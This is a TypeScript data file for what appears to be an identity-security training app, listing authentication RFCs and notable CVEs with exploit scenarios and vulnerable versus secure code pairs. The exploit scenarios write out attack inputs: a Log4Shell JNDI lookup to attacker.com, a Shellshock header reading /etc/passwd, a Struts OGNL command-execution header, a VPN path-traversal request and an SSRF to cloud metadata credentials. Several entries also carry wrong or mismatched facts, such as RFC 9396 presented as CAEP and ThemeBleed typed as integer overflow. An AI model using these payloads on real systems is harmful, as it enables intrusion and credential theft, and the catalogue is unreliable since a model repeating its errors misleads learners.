export type ResearchDifficulty = 'Beginner' | 'Intermediate' | 'Advanced'

export interface CveDetails {
  id: string
  title: string
  cvss: number
  component: string
  vulnerabilityType: string
  difficulty: ResearchDifficulty
  description: string
  exploitScenario: string
  patchRemediation: string
  vulnerableCode: string
  secureCode: string
}

export interface RfcDetails {
  number: string
  title: string
  status: 'Live' | 'Draft' | 'Deprecated'
  category: string
  difficulty: ResearchDifficulty
  description: string
  keyTakeaway: string
}

// Slugifies an RFC/draft "number" field (e.g. "RFC 6749" -> "rfc-6749", "OAuth 2.1" -> "oauth-2-1")
// into a stable, URL-safe id used for the ?rfc=<slug> deep link.
export function rfcSlug(number: string): string {
  return number.toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-+|-+$/g, '')
}

export const RFC_DATABASE: RfcDetails[] = [
  {
    number: 'RFC 6749',
    title: 'The OAuth 2.0 Authorization Framework',
    status: 'Live',
    category: 'Federation & Delegation',
    difficulty: 'Beginner',
    description: 'The industry-standard protocol for token-based delegation, defining Authorization Code, Implicit, Resource Owner Credentials, and Client Credentials flows.',
    keyTakeaway: 'Deprecates implicit and password grants in modern client configurations in favor of authorization codes with PKCE.'
  },
  {
    number: 'RFC 7519',
    title: 'JSON Web Token (JWT)',
    status: 'Live',
    category: 'Tokens',
    difficulty: 'Beginner',
    description: 'Defines a compact, self-contained JSON structure for cryptographically sharing claims (identity context) across system boundaries.',
    keyTakeaway: 'Always validate signatures (using standard algorithms, avoiding alg: "none") and verify claims (iss, exp, aud) on receipt.'
  },
  {
    number: 'RFC 6238',
    title: 'TOTP: Time-Based One-Time Password Algorithm',
    status: 'Live',
    category: 'Multi-Factor Authentication',
    difficulty: 'Beginner',
    description: 'Extends HOTP (RFC 4226) with a time-step counter, producing a rotating 6-digit code from a shared secret and the current Unix time.',
    keyTakeaway: 'Servers must allow a small clock-skew window (±1 step) and reject reused codes to stop replay within the same time step.'
  },
  {
    number: 'RFC 4511',
    title: 'Lightweight Directory Access Protocol (LDAP): The Protocol',
    status: 'Live',
    category: 'Directory Services',
    difficulty: 'Beginner',
    description: 'Defines the wire protocol for querying and modifying hierarchical directory information trees (DITs) used by Active Directory and OpenLDAP.',
    keyTakeaway: 'Always bind over LDAPS/StartTLS — plain LDAP binds transmit credentials and search results unencrypted.'
  },
  {
    number: 'RFC 7636',
    title: 'Proof Key for Code Exchange (PKCE) by Mobile/SPA Clients',
    status: 'Live',
    category: 'Security Extensions',
    difficulty: 'Intermediate',
    description: 'Mitigates authorization code interception attacks on public clients by requiring cryptographical code challenge/verifier validations.',
    keyTakeaway: 'Mandatory for all Single Page Applications (SPAs) and native mobile apps to block code replay exploits.'
  },
  {
    number: 'RFC 7643',
    title: 'SCIM 2.0: Core Schema Definition',
    status: 'Live',
    category: 'Provisioning',
    difficulty: 'Intermediate',
    description: 'Specifies the common identity schemas (Users, Groups) to enable automated lifecycle management across distinct software directories.',
    keyTakeaway: 'Enforces standard LDAP-like JSON mappings (e.g. givenName, familyName, emails, active) across SaaS target networks.'
  },
  {
    number: 'RFC 7644',
    title: 'SCIM 2.0: Protocol',
    status: 'Live',
    category: 'Provisioning',
    difficulty: 'Intermediate',
    description: 'Defines the REST API bindings (GET/POST/PUT/PATCH/DELETE, filtering, bulk operations) that move SCIM Core Schema resources between IdP and SP.',
    keyTakeaway: 'PATCH operations must be applied atomically — a partially-applied bulk PATCH can leave a user mid-provisioned with stale group membership.'
  },
  {
    number: 'RFC 7009',
    title: 'OAuth 2.0 Token Revocation',
    status: 'Live',
    category: 'Tokens',
    difficulty: 'Intermediate',
    description: 'Defines a standard endpoint for clients to explicitly invalidate an access or refresh token before its natural expiry.',
    keyTakeaway: 'Revoking a refresh token should cascade to invalidate every access token issued from it, not just the token presented.'
  },
  {
    number: 'RFC 7662',
    title: 'OAuth 2.0 Token Introspection',
    status: 'Live',
    category: 'Tokens',
    difficulty: 'Intermediate',
    description: 'Lets a resource server ask the authorization server whether an opaque or JWT access token is still active, and retrieve its metadata.',
    keyTakeaway: 'Required for opaque (non-JWT) tokens, since a resource server has no local way to validate their claims or expiry otherwise.'
  },
  {
    number: 'RFC 8414',
    title: 'OAuth 2.0 Authorization Server Metadata',
    status: 'Live',
    category: 'Discovery',
    difficulty: 'Intermediate',
    description: 'Standardizes a `/.well-known/oauth-authorization-server` JSON document advertising endpoints, supported grants, and signing algorithms.',
    keyTakeaway: 'Clients should fetch and cache this document rather than hardcoding authorization/token endpoint URLs, easing IdP migrations.'
  },
  {
    number: 'RFC 8628',
    title: 'OAuth 2.0 Device Authorization Grant',
    status: 'Live',
    category: 'Federation & Delegation',
    difficulty: 'Intermediate',
    description: 'Enables sign-in on input-constrained devices (smart TVs, CLIs) by displaying a short user code the user enters on a second device.',
    keyTakeaway: 'The device must poll the token endpoint at the server-specified interval — polling faster returns a `slow_down` error.',
  },
  {
    number: 'RFC 4120',
    title: 'The Kerberos Network Authentication Service (V5)',
    status: 'Live',
    category: 'Enterprise Authentication',
    difficulty: 'Advanced',
    description: 'Defines ticket-based mutual authentication using a trusted Key Distribution Center (KDC) issuing TGTs and service tickets encrypted with symmetric keys.',
    keyTakeaway: 'A compromised krbtgt account key lets an attacker forge unlimited "Golden Tickets" — rotate it twice after any suspected domain compromise.'
  },
  {
    number: 'RFC 9068',
    title: 'JWT Profile for OAuth 2.0 Access Tokens',
    status: 'Live',
    category: 'Tokens',
    difficulty: 'Advanced',
    description: 'Standardizes claims (iss, exp, aud, client_id, scope) so JWT-formatted access tokens are interoperable across authorization servers.',
    keyTakeaway: 'Resource servers must still validate `aud` — a validly-signed JWT meant for a different API must not be accepted just because the signature checks out.'
  },
  {
    number: 'RFC 9449',
    title: 'OAuth 2.0 Demonstrating Proof-of-Possession (DPoP)',
    status: 'Live',
    category: 'Security Extensions',
    difficulty: 'Advanced',
    description: 'Sender-constrains bearer tokens by binding them to a client-held key pair, proven via a signed DPoP JWT on every request.',
    keyTakeaway: 'Defeats bearer-token replay from a stolen token alone — the attacker also needs the client\'s private signing key.'
  },
  {
    number: 'RFC 9396',
    title: 'Continuous Access Evaluation Protocol (CAEP / SSF)',
    status: 'Live',
    category: 'Zero Trust',
    difficulty: 'Advanced',
    description: 'Defines real-time event sharing schemas (session termination, device changes) to allow Identity Providers to push instant security posture updates.',
    keyTakeaway: 'Enables continuous token audits instead of waiting for standard 1-hour JWT expiration periods.'
  },
  {
    number: 'RFC 9635',
    title: 'Grant Negotiation and Authorization Protocol (GNAP)',
    status: 'Draft',
    category: 'Next-Gen Standards',
    difficulty: 'Advanced',
    description: 'A ground-up redesign of delegated authorization covering non-redirect-based clients, multiple access tokens per grant, and richer interaction modes than OAuth 2.0.',
    keyTakeaway: 'Not a drop-in OAuth replacement — GNAP models grants, tokens, and interaction as distinct first-class resources with their own lifecycle.'
  },
  {
    number: 'OAuth 2.1',
    title: 'OAuth 2.1 Security Best Practices (Draft)',
    status: 'Draft',
    category: 'Next-Gen Standards',
    difficulty: 'Advanced',
    description: 'Consolidates ten years of security patches, making PKCE mandatory, deprecating implicit/resource owner grants, and enforcing exact redirect matching.',
    keyTakeaway: 'Modernizes and hardens the baseline OAuth 2.0 spec, closing structural redirect and token leakage gaps.'
  }
]

export const CVE_DATABASE: CveDetails[] = [
  {
    id: 'CVE-2022-23529',
    title: 'jsonwebtoken Insecure `secretOrPublicKey` Handling',
    cvss: 7.6,
    component: 'jsonwebtoken (Node.js library)',
    vulnerabilityType: 'Algorithm Confusion / Improper Input Validation',
    difficulty: 'Beginner',
    description: 'Passing an attacker-controlled, untrusted secret or key into `jwt.verify()` lets a caller forge a validly-"signed" token because the library trusts whatever key material it is handed.',
    exploitScenario: 'An app reads the JWKS/secret dynamically from a request parameter or unvalidated config, so an attacker supplies their own key and self-signs an admin token.',
    patchRemediation: 'Upgrade to jsonwebtoken v9+, always hardcode/allowlist the expected `alg`, and never source verification keys from user-controlled input.',
    vulnerableCode: `// Vulnerable: key material comes from an attacker-influenced source\nconst key = req.query.key || defaultSecret\njwt.verify(token, key)`,
    secureCode: `// Secure: fixed server-side secret, explicit algorithm allowlist\njwt.verify(token, SERVER_SECRET, { algorithms: ['HS256'] })`
  },
  {
    id: 'CVE-2015-9235',
    title: 'jsonwebtoken `alg: none` Signature Bypass',
    cvss: 9.8,
    component: 'jsonwebtoken (Node.js library, pre-v4)',
    vulnerabilityType: 'Missing Signature Verification',
    difficulty: 'Beginner',
    description: 'Early jsonwebtoken versions honored a JWT header claiming `alg: "none"`, skipping signature verification entirely and accepting any forged payload.',
    exploitScenario: 'Attacker edits the JWT header to `{"alg":"none"}`, strips the signature, and rewrites the payload to `{"role":"admin"}` — the server accepts it unsigned.',
    patchRemediation: 'Upgrade past jsonwebtoken v4.0.0 and always pass an explicit `algorithms` allowlist to `verify()` so `none` is rejected outright.',
    vulnerableCode: `// Vulnerable: verify() has no algorithm allowlist\njwt.verify(token, secretOrPublicKey)`,
    secureCode: `// Secure: explicitly reject "none" and any unexpected algorithm\njwt.verify(token, secretOrPublicKey, { algorithms: ['RS256'] })`
  },
  {
    id: 'CVE-2019-7644',
    title: 'node-samlify Signature Wrapping (SAML Auth Bypass)',
    cvss: 9.8,
    component: 'node-samlify / SAML SP libraries',
    vulnerabilityType: 'XML Signature Wrapping (SSW)',
    difficulty: 'Intermediate',
    description: 'The SAML response parser located and validated a signed `<Assertion>` node, but a separate code path read identity claims from the first `<Assertion>` in document order — an attacker could wrap a legitimately-signed assertion around a forged, unsigned one.',
    exploitScenario: 'Attacker intercepts a valid SAML response, duplicates the signed Assertion as a decoy, and inserts a new unsigned Assertion claiming `admin@victim.com` that the SP reads identity from.',
    patchRemediation: 'Upgrade the SAML library, and ensure the code that extracts claims operates on the exact node the `<ds:Reference URI>` in the signature points to — never "the first assertion in the document."',
    vulnerableCode: `// Vulnerable: reads claims from document order, not the signed reference\nconst assertion = xml.querySelector('Assertion')\nconst user = assertion.querySelector('NameID').textContent`,
    secureCode: `// Secure: resolve the signed node via the signature's Reference URI\nconst signedId = signature.querySelector('Reference').getAttribute('URI').slice(1)\nconst assertion = xml.getElementById(signedId)\nconst user = assertion.querySelector('NameID').textContent`
  },
  {
    id: 'CVE-2020-13379',
    title: 'Grafana Unauthenticated Avatar Proxy SSRF (Credential Leak)',
    cvss: 7.5,
    component: 'Grafana (avatar/gravatar proxy)',
    vulnerabilityType: 'Server-Side Request Forgery',
    difficulty: 'Intermediate',
    description: 'The unauthenticated `/avatar/` endpoint proxied arbitrary attacker-supplied URLs server-side, allowing internal network reconnaissance and metadata-service credential theft.',
    exploitScenario: 'Attacker requests `/avatar/<hash>` crafted to resolve internally, causing Grafana to fetch `http://169.254.169.254/latest/meta-data/iam/security-credentials/` and leak cloud IAM role credentials in the response.',
    patchRemediation: 'Upgrade Grafana to a patched release and block outbound requests from app servers to the cloud metadata IP range at the network layer.',
    vulnerableCode: `// Vulnerable: proxies any URL derived from user-controlled input\napp.get('/avatar/:hash', (req, res) => proxyFetch(resolveAvatarUrl(req.params.hash)).pipe(res))`,
    secureCode: `// Secure: allowlist outbound hosts and block internal/link-local ranges\nif (!isAllowedAvatarHost(url) || isLinkLocalOrPrivate(url)) throw new Error('blocked')`
  },
  {
    id: 'CVE-2021-27582',
    title: 'FreeRADIUS EAP-pwd Buffer Over-read',
    cvss: 7.5,
    component: 'FreeRADIUS (rlm_eap_pwd)',
    vulnerabilityType: 'Out-of-Bounds Read',
    difficulty: 'Intermediate',
    description: 'A crafted EAP-pwd Commit frame with an invalid scalar/element could cause the RADIUS server to read past an allocated buffer during Wi-Fi/802.1X authentication, crashing the auth service.',
    exploitScenario: 'Attacker joins the wireless authentication exchange and sends a malformed EAP-pwd Commit packet, denying authentication service to legitimate users on the network.',
    patchRemediation: 'Upgrade to a patched FreeRADIUS release; validate scalar/element bounds before use in the EAP-pwd state machine.',
    vulnerableCode: `// Vulnerable: trusts attacker-supplied length without bounds validation\nmemcpy(out, packet->scalar, packet->scalar_len); // scalar_len unchecked`,
    secureCode: `// Secure: validate length against the expected fixed field size first\nif (packet->scalar_len != EXPECTED_SCALAR_LEN) return EAP_FAIL;\nmemcpy(out, packet->scalar, packet->scalar_len);`
  },
  {
    id: 'CVE-2023-38146',
    title: 'Windows Themes Remote Code Execution (ThemeBleed)',
    cvss: 8.8,
    component: 'Windows Themes / API Layer',
    vulnerabilityType: 'Integer Overflow',
    difficulty: 'Intermediate',
    description: 'Vulnerability in the Windows Themes API where opening a crafted `.theme` file loads a remote DLL without certificate validation.',
    exploitScenario: 'Victim downloads or previews a malicious theme package, triggering an automatic RPC call that loads the attacker\'s DLL.',
    patchRemediation: 'Apply Microsoft September 2023 KB updates or disable the Windows Themes service if unnecessary.',
    vulnerableCode: `// Vulnerable: Loads DLL from arbitrary remote SMB directories\nLoadLibraryExW("\\\\remote-smb\\share\\theme.dll", NULL, LOAD_LIBRARY_SEARCH_DLL_LOAD_DIR);`,
    secureCode: `// Secure: Restrict DLL load paths to verified local system folder paths\nLoadLibraryExW("C:\\\\Windows\\\\System32\\\\theme.dll", NULL, LOAD_LIBRARY_SEARCH_SYSTEM32);`
  },
  {
    id: 'CVE-2024-21626',
    title: 'runc container escape (Filesystem Leak)',
    cvss: 8.6,
    component: 'runc (container runtime)',
    vulnerabilityType: 'Directory Traversal',
    difficulty: 'Advanced',
    description: 'Internal file descriptors kept open during runc execution allow containerized processes to access host directory paths, leading to container escapes.',
    exploitScenario: 'Attacker deploys a malicious container image that exploits open file descriptors to execute host command shells as root.',
    patchRemediation: 'Upgrade to runc v1.1.12 or later to enforce strict descriptor lockdowns on container boot cycles.',
    vulnerableCode: `// Insecure execution mapping\nexecve("/proc/self/fd/7/...", args, env);`,
    secureCode: `// Secure runtime descriptor isolation\nclose_open_fds_except(3); // Hard lock FDs before container execution`
  },
  {
    id: 'CVE-2022-22965',
    title: 'Spring4Shell Remote Code Execution',
    cvss: 9.8,
    component: 'Spring Framework (Java)',
    vulnerabilityType: 'Class Loader Manipulation',
    difficulty: 'Advanced',
    description: 'Allows remote attackers to manipulate the class loader via parameter binding, enabling them to upload arbitrary web shells into host servers.',
    exploitScenario: 'Attacker sends a crafted HTTP POST request with query parameters targeting `class.module.classLoader` to rewrite Apache Tomcat logs.',
    patchRemediation: 'Upgrade to Spring Framework v5.3.18 / v5.2.20 or later to restrict active classloader parameters.',
    vulnerableCode: `// Vulnerable: Permissive class properties mapping\nPropertyDescriptorDescriptor pd = getPropertyDescriptor(beanClass, name);\n// Evaluates deep properties mapping like class.module.classLoader`,
    secureCode: `// Secure: Whitelist properties or explicitly deny classLoader parameters\nif (name.contains("classLoader") || name.contains("protectionDomain")) {\n  throw new SecurityException("Unauthorized parameter binding!");\n}`
  },
  {
    id: 'CVE-2021-44228',
    title: 'Log4Shell (Remote Code Execution)',
    cvss: 10.0,
    component: 'Apache Log4j2 (Java)',
    vulnerabilityType: 'JNDI LDAP Injection',
    difficulty: 'Advanced',
    description: 'Log4j2 parsing handles JNDI lookups (e.g. `${jndi:ldap://}`) automatically on log evaluations, letting servers load and execute remote classes.',
    exploitScenario: 'Attacker inserts `${jndi:ldap://attacker.com/a}` into an HTTP User-Agent header. Log4j logs the header, triggers JNDI, and runs the payload.',
    patchRemediation: 'Upgrade to Log4j v2.17.1 or later. Alternatively, set `FORMAT_MSG_NO_LOOKUPS=true` or remove the JndiLookup class.',
    vulnerableCode: `// Vulnerable: Log4j parses nested lookup formats automatically\nlogger.info("User Agent: " + userAgent);\n// Evaluates: "\${jndi:ldap://attacker-domain/exploit}"`,
    secureCode: `// Secure: Interpolate logs safely as static arguments, disabling nested lookups\nlogger.info("User Agent: {}", userAgent); // Interpolation blocks recursive evaluation`
  },
  {
    id: 'CVE-2020-1472',
    title: 'Zerologon — Netlogon Elevation of Privilege',
    cvss: 10.0,
    component: 'Windows Netlogon Remote Protocol (AD Domain Controller)',
    vulnerabilityType: 'Weak Cryptographic Implementation',
    difficulty: 'Advanced',
    description: 'A flawed AES-CFB8 implementation in the Netlogon handshake let an unauthenticated attacker forge a valid Netlogon session and reset the Domain Controller\'s machine account password to an empty string.',
    exploitScenario: 'Attacker on the internal network repeatedly authenticates as the DC computer account (success probability ~1/256 per try) until the crypto weakness lets them zero out its password, then impersonates the DC to dump the entire domain\'s credentials.',
    patchRemediation: 'Apply the August 2020 Microsoft patch and enable enforcement mode requiring secure RPC for all Netlogon connections.',
    vulnerableCode: `// Vulnerable: uses a fixed all-zero IV, letting forged 8-byte challenges succeed statistically\nAES_CFB8_Encrypt(clientChallenge, sessionKey, iv=ZERO_IV);`,
    secureCode: `// Secure: enforce Secure RPC (signing+sealing) for every Netlogon channel, no fallback\nif (!(flags & NETLOGON_SECURE_RPC)) { RejectConnection(); }`
  },
  {
    id: 'CVE-2014-6271',
    title: 'Shellshock — Bash Environment Variable Command Injection',
    cvss: 9.8,
    component: 'GNU Bash',
    vulnerabilityType: 'Command Injection',
    difficulty: 'Advanced',
    description: 'Bash incorrectly continued parsing and executing shell commands appended after a specially-crafted function definition stored in an environment variable, letting CGI-style identity/auth gateways execute attacker code.',
    exploitScenario: 'Attacker sends `User-Agent: () { :; }; /bin/bash -c "cat /etc/passwd"` to a CGI-backed SSO/auth gateway that forwards headers into environment variables read by Bash.',
    patchRemediation: 'Patch Bash to a version that stops parsing after the function definition, and avoid passing untrusted input into subprocess environment variables entirely.',
    vulnerableCode: `# Vulnerable: environment variable trusted and passed straight to bash\nexport HTTP_USER_AGENT="$1"\nbash -c 'echo "$HTTP_USER_AGENT"'`,
    secureCode: `# Secure: never source untrusted headers into a shell environment; use exec-family APIs with args, not a shell\nsubprocess.run(["echo", user_agent], shell=False)`
  },
  {
    id: 'CVE-2017-5638',
    title: 'Apache Struts 2 OGNL Remote Code Execution',
    cvss: 10.0,
    component: 'Apache Struts 2 (Jakarta Multipart parser)',
    vulnerabilityType: 'OGNL Expression Injection',
    difficulty: 'Beginner',
    description: 'A malformed `Content-Type` header during file upload triggered an unhandled exception whose error message was evaluated as an OGNL expression, letting an unauthenticated attacker run arbitrary server commands.',
    exploitScenario: 'Attacker sends a POST request with `Content-Type: %{(#cmd=\'id\').(#process=@java.lang.Runtime@getRuntime().exec(#cmd))}`, and Struts evaluates it as code instead of a literal header.',
    patchRemediation: 'Upgrade to a patched Struts 2 release; never evaluate user-controlled input (including headers) as an OGNL/EL expression.',
    vulnerableCode: `// Vulnerable: exception text derived from the raw header is OGNL-evaluated\nthrow new LocalizedMessage(this.getClass(), contentTypeHeader, null, null);`,
    secureCode: `// Secure: sanitize/escape header values and never feed raw input into an expression evaluator\nString safe = OgnlSanitizer.escape(contentTypeHeader);`
  },
  {
    id: 'CVE-2019-11510',
    title: 'Pulse Secure VPN Arbitrary File Read (Credential Theft)',
    cvss: 10.0,
    component: 'Pulse Connect Secure (SSL VPN)',
    vulnerabilityType: 'Path Traversal / Pre-Auth File Disclosure',
    difficulty: 'Beginner',
    description: 'An unauthenticated path-traversal request against the VPN\'s web interface could read arbitrary files, including cached plaintext credentials and session cookies used for SSO into the internal network.',
    exploitScenario: 'Attacker sends `GET /dana-na/../dana/html5acc/guacamole/../../../../etc/passwd?/dana/html5acc/guacamole/` to dump session databases and harvest active SSO session tokens without logging in.',
    patchRemediation: 'Apply the vendor security patch immediately and rotate all credentials/session secrets exposed on the appliance after any suspected compromise.',
    vulnerableCode: `// Vulnerable: user-supplied path segments concatenated directly into a filesystem read\nString path = webroot + request.getParameter("file");\nreturn new FileInputStream(path);`,
    secureCode: `// Secure: canonicalize and verify the resolved path stays inside the webroot\nPath resolved = Paths.get(webroot, filename).normalize();\nif (!resolved.startsWith(webroot)) throw new SecurityException("traversal blocked");`
  }
]
